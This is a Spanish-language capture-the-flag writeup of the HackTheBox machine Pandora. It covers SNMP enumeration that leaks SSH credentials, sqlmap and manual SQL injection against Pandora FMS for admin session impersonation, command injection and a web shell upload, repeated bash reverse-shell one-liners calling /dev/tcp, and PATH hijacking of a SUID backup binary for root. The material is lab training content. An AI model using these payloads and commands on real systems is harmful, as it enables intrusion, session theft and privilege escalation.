---
title: "Pandora"
date: 2025-05-29 16:41:38 +0200
categories: writeups HackTheBox
tags: pandora inyecciónsql portforwarding snmp pathhijacking rce linux
description: Writeup de la máquina Pandora de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Reconocimiento

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112134108.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.136`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.136 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112134256.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.11.136 -oN targeted
```

En el segundo escaneo de **Nmap** no veremos nada interesante:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112134325.png>)
___
## Explotación

Si accedemos a la página web alojada en el puerto **80** lo único interesante que veremos es un dominio, es decir **panda.htb**.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112171420.png>)

Añadiremos dicho dominio al **/etc/hosts** gracias a la siguiente línea: `10.10.11.136  panda.htb` y al acceder a **panda.htb** veremos la misma página que si lo hacemos a través de la **Dirección IP**.

Volveremos a revisar la página web y veremos un formulario pero este no nos llevará a ningún lado.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112172521.png>)

Como tenemos tan pocas opciones comenzaremos a realizar fuzzing de directorios usando **Gobuster** de la siguiente forma:

```bash
gobuster dir -u http://panda.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js -t 50
```

Observamos que nos descubre el directorio **/assets**:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112172054.png>)

Al acceder a dicho directorio veremos que tiene capacidad de **Directory Listing** pero no veremos nada interesante en él:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112172104.png>)

En último lugar pasaremos a realizar fuzzing de subdominios, para ello emplearemos **Wfuzz** de la siguiente forma:

```bash
wfuzz -c -u http://panda.htb -H 'Host: FUZZ.panda.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 33560
```

Veremos que no nos reporta nada por lo que estamos ante un **Rabbit Hole**, es decir no encontramos ninguna vía potencial de ganar acceso a la máquina víctima a través de la página web por lo que debemos de pensar **Out The Box** y para buscar una alternativa.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112172355.png>)

Como última opción nos queda realizar un escaneo por **UDP** para ello usaremos el siguiente comando gracias a **Nmap**:

```bash
nmap -sU --top-ports 100 -T5 --open 10.10.11.136 -oG 100PortsUDP
```

Tal y como vemos a continuación **Nmap** nos reporta que el puerto **161** se encuentra abierto:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112173120.png>)

> El puerto **161** se utiliza principalmente para el protocolo **SNMP (Simple Network Management Protocol)**, el cual es un protocolo  utilizado para la monitorización y gestión de dispositivos en redes, como servidores, routers, switches, impresoras,...

Realizaremos un escaneo más exhaustivo sobre dicho puerto (**161**) pasándole un conjunto de script básicos de reconocimiento, y además reportaremos el servicio y versión gracias al siguiente comando de **Nmap**:

```bash
nmap -p161 -sU -sCV 10.10.11.136 -T5 -oN targetedUDP
```

Observamos como nos reporta un montón de información, y entre todo ese montón veremos una credenciales (**daniel:HotelBabylon23**):

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112173650.png>)

En el caso de que no hayamos realiza el escaneo más exhaustivo sobre el puerto **161** existe otra forma válida de enumerar esta información y es usando **snmpwalk** o **snmpbulkwalk** la cual nos reporta la información mucho más rápido.

Para enumerar la información del puerto **161** hemos de conocer la **community string** que es algo similar a una contraseña, en muchos casos se usa la **community string** **public** por lo que podríamos probar con esta, en definitiva ejecutaremos el siguiente comando:

```bash
snmpbulkwalk -c public -v2c 10.10.11.136 . > snmp_enum.txt
```

Gracias al anterior comando veremos que nos reporta un montón de información de la máquina víctima, así como **procesos** en ejecución o la **Dirección IP** de versión **6** (**IPv6**) pero lo que más nos llama la atención es la cadena **Daniel**:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112173933.png>)

Realizaremos una búsqueda por la cadena **daniel** sobre el archivo donde tenemos toda la información dumpeada y veremos el proceso en el cual somos capaces de ver la contraseña para dicho usuario:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112174320.png>)

Si bien recordamos el servicio de **ssh** se encontraba abierto por lo que probaremos a conectarnos usando las credenciales encontradas usando el siguiente comando:

```bash
ssh daniel@10.10.11.136
```

Observamos como conseguimos acceder a la máquina vícitima.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112175349.png>)
___
## Escalada de privilegios

> Destacar que para que nos funcione el <kbd>CTRL</kbd> + <kbd>L</kbd> (**clear**) debemos de hacer un `export TERM=xterm`.
### User pivoting

Antes de buscar una manera de elevar nuestros privilegios miraremos los usuarios que se encuentran en el sistema y veremos que existe el usuario **matt** :

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112175526.png>)

Al acceder a su **home** veremos que en el ella se haya el **user.txt** pero no somos capaces leerla por lo que suponemos que antes de elevar nuestros privilegios hemos de convertirnos en el usuario **matt**.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112175602.png>)

Buscaremos algún por algún servicio interno pero no veremos nada:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112175834.png>)

Al acceder a **/var/www** veremos el **Document Root** **html** el cual hace referencia a la página web que vemos a través del puerto **80** pero observamos otro **Document Root** llamado **pandora**.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112175942.png>)

Nos dirigiremos al archivo de configuración de apache2 y veremos que se trata de un sitio web montado internamente por el puerto **80**.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112180136.png>)

Para acceder a dicho sitio realizaremos **Port Forwarding** usando **ssh** de la siguiente forma:

```bash
ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
```

Una vez realizado el **Port Forwarding** veremos que podemos acceder a dicha página y además veremos la versión (**v7.0NG.742**) para el servicio **Pandora FMS**:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112180956.png>)
#### Way 1 - SQL Injection → RCE
##### Automated - SQLMap

Tras buscar por internet por posibles exploits nos daremos cuenta que es vulnerable a una **SQL Injection**, dicha inyección la podemos encontrar en la siguiente ruta: **/pandora_console/include/chart_generator.php?session_id=1'**:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112184705.png>)
###### Base de datos

Una vez que conocemos la ruta donde se acontece la **SQL Injection** podemos tirar de **SQLMap** para dumpear toda la información de la base de datos, en primer lugar comenzaremos enumerando las bases de datos con el siguiente comando: 

```bash
sqlmap -u "http://127.0.0.1/pandora_console//include/chart_generator.php?session_id=1" --dbs --batch
```

Observamos que tan solo existen dos bases de datos pero la que más nos llama la atención es la de **pandora**:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112184851.png>)
###### Tablas de pandora

Una vez que conocemos el nombre de la base de datos (**pandora**) enumeraremos las tablas gracias al siguiente comando:

```bash
sqlmap -u "http://127.0.0.1/pandora_console//include/chart_generator.php?session_id=1" -D pandora --tables --batch
```

Observamos que nos reporta un montón de tablas pero las que más nos llaman la atención son **tusuario** y **tsessions_php**:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112185833.png>)
###### Dumpeando la tabla tusuario

Pasaremos a dumpear la información de la tabla **tusuario** con el siguiente comando: 

```bash
sqlmap -u "http://127.0.0.1/pandora_console//include/chart_generator.php?session_id=1" -D pandora -T tusuario --dump -C 'id_user, password' --batch
```

Observamos diferentes contraseñas hasheadas en **MD5** ya que tiene tienen **32** caracteres pero no podremos romperlas:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112190519.png>)
###### Dumpeando la tabla tsessions_php

Como no hemos sido capaces de crackear las contraseñas encontradas pasaremos a dumpear la información de la tabla **tsessions_php**, para ello ejecutaremos el siguiente comando:

```bash
sqlmap -u "http://127.0.0.1/pandora_console//include/chart_generator.php?session_id=1" -D pandora -T tsessions_php --dump --batch --where "data<>''" # También es válido poner --where "data IS NOT NULL"
```

Observamos como nos reporta un montón de sesiones para el usuario **daniel** pero nos llamará la atención la del usuario **matt**:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112190828.png>)

Una vez que tenemos la sesión del usuario **matt** probaremos a introducirla en el **Storage**:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112191152.png>)

Conseguiremos acceder al panel de **Pandora FMS** pero veremos que no podemos hacer nada interesante ya que no somos el usuario administrador.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112191552.png>)

Si buscamos en **searchsploit** nos daremos cuenta que existe un exploit pero tras probarlo nos daremos cuenta que tan solo podemos conseguir la **RCE** siendo usuario administrador.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112191943.png>)

Buscando en internet nos encontraremos con la siguiente lista: [Pandora - CVE List](https://pandorafms.com/en/security/common-vulnerabilities-and-exposures/) a través de la cual podemos ver todos los **CVEs** que ha tenido **Pandora FMS** a lo largo de su historia, nos llamará la atención estos dos **CVEs**: **CVE-2020-13851 (RCE)** y **CVE-2020-8947 (RCE)**, ya que con a través de estos podemos llegar a ejecutar comandos remotamente, destacar que este último **CVE** no nos funcionará.

En primer lugar, buscaremos por el **CVE-2020-13851** y encontraremos está página ([CoreSecurity - Pandora FMS](https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities)) donde nos explica bastante detalladamente como obtener la ejecución remota de comandos (**RCE**).

Básicamente lo que debemos de hacer es realizar una petición por **POST** a **/pandora_console/ajax.php** y colar un comando a través del parámetro **target** tal y como vemos a continuación:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112201910.png>)

Gracias a **FoxyProxy** y a **BurpSuite** capturaremos una petición a **/pandora_console**, la enviaremos al **Repeater** donde la adaptaremos según lo que hemos visto antes y veremos que tenemos ejecución remota de comandos (**RCE**):

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112202033.png>)

En este punto lo que haremos será ponernos en escucha con **NetCat** (`nc -nlvp 443`) y nos enviaremos una **Reverse Shell** gracias al típico one liner de bash (`bash -c "bash -i >%26 /dev/tcp/10.10.14.21/433 0>%261"`).

Observamos como hemos conseguido ganar acceso a la máquina como el usuario **matt** por lo que en este punto debemos de buscar una forma de convertirnos en **root**.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112202405.png>)
#### Way 2 - SQL Injection → Impersonated Admin

Tras buscar exploits para esta versión de **Pandora FMS** nos toparemos con el siguiente [repositorio](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated) el cual tiene un exploit que nos permite convertirnos en el usuario administrador por lo que seremos capaces de ejecutar comandos remotamente.
##### Automated - Python Exploit

Nos descargaremos el exploit (`wget https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/refs/heads/master/sqlpwn.py`) y veremos que necesita los siguiente argumentos:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112223918.png>)

Volveremos a ejecutar el exploit pero esta vez con los parámetros correspondientes y veremos que tenemos ejecución remota de comandos (**RCE**) en la máquina víctima:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112224046.png>)

En este punto lo que haremos será ponernos en escucha con **NetCat** (`nc -nlvp 443`) y nos enviaremos una **Reverse Shell** gracias al típico one liner de bash (`bash -c "bash -i >%26 /dev/tcp/10.10.14.21/433 0>%261"`).

Observamos como hemos conseguido ganar acceso a la máquina como el usuario **matt** por lo que en este punto debemos de buscar una forma de convertirnos en **root**.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112224353.png>)
##### Manual

Tras revisar el código veremos lo que está haciendo el exploit para convertirse en el usuario administrador, y es a través de una **SQL Injection** para posteriormente robar la cookie del usuario administrador y ganar acceso al panel como dicho usuario.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112224443.png>)

A través del navegador acceder a la siguiente ruta:

```http
http://localhost/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
```

Y veremos que al acceder nuevamente a `http://localhost/pandora_console/` nos logea automáticamente como el usuario **admin**.

En este punto lo que debemos de hacer es buscar una forma de ejecutar comandos remotamente, para ello nos dirigimos a **Admin tools → File Manager**:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112224924.png>)

Una vez que estamos en el **File Manager** veremos que nos esta mostrando el listado del directorio **images** por lo que si accedemos a **/pandora_console/images** veremos las mismas imágenes:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112225005.png>)

En este punto lo que haremos será subir un fichero que nos permita ejecutar comandos remotamente (**RCE**), para ello le daremos al botón de subir un fichero y seleccionaremos el **cmd.php**:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112225041.png>)

Veremos que nos dice que el archivo se ha subido correctamente por lo que en este punto lo que debemos de hacer ahora es acceder a **/pandora_console/images** y buscar nuestro **cmd.php** ya que se ha subido en este ruta, una vez localizado veremos que hemos conseguido ejecutar comandos (**RCE**) en la máquina víctima como el usuario **matt**:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112225136.png>)

En este punto lo que haremos será ponernos en escucha con **NetCat** (`nc -nlvp 443`) y nos enviaremos una **Reverse Shell** gracias al típico one liner de bash (`bash -c "bash -i >%26 /dev/tcp/10.10.14.21/433 0>%261"`).

Observamos como hemos conseguido ganar acceso a la máquina como el usuario **matt** por lo que en este punto debemos de buscar una forma de convertirnos en **root**.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112224353.png>)
### root

> En el caso de que hayamos ganado acceso a la máquina víctima a través de una **Reverse Shell** debemos de realizar un **Tratamiento de la TTY** para tener una consola totalmente interactiva y cómoda.

Una vez hemos conseguido convertirnos en el usuario **matt** nos daremos cuenta que al intentar mirar nuestros permisos de **Sudoers** nos salta un error bastante extraño debido a la **Reverse Shell**.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112202641.png>)

Para evitar este error nos conectaremos a través de **ssh** generando una clave privada para ello debemos de ejecutar los siguientes  comandos:

```bash
mkdir /home/matt/.ssh
cd /home/matt/.ssh
ssk-keygen # Le damos al Enter cuantas veces sea necesaria
cat /home/matt/.ssh/id_rsa.pub > /home/matt/.ssh/authorized_keys
cat /home/matt/.ssh/id_rsa # Nos la copiamos a nuestra máquina de atacante
# En nuestra máquina de atacante
chmod 600 id_rsa
ssh -i id_rsa matt@10.10.14.21
```

Veremos que ahora no nos salta el error de antes:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112202751.png>)

Al mirar por permisos **SUID** nos llama la atención el binario **/usr/bin/pandora_backup**:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112203244.png>)

Como es un binario y no podemos ver su contenido trataremos de ver las cadenas de texto imprimibles con `strings` pero veremos que no está instalado en la máquina por lo que alternativamente podemos usar `ltrace` para ver las llamadas a las librerías dinámicas.

Observaremos que está usando el comando **tar** de manera relativa por lo que podemos intentar explotar un **PATH Hijacking**.

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112203400.png>)

Para realizar un **PATH Hijacking** nos crearemos un archivo **tar** en **/tmp** y cambiaremos nuestro PATH, básicamente sería ejecutar estos comandos:

```bash
export PATH=/tmp:$PATH
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > tar
chmod +x tar
/usr/bin/pandora_backup
```

Observamos que la **/tmp/bash** obtiene permisos **SUID** por lo que ya podremos convertirnos  en el usuario **root** de manera efectiva (**efective user id**) con un `bash -p`:

![](<../assets/images/posts/2025-05-29-pandora/Pasted image 20250112223049.png>)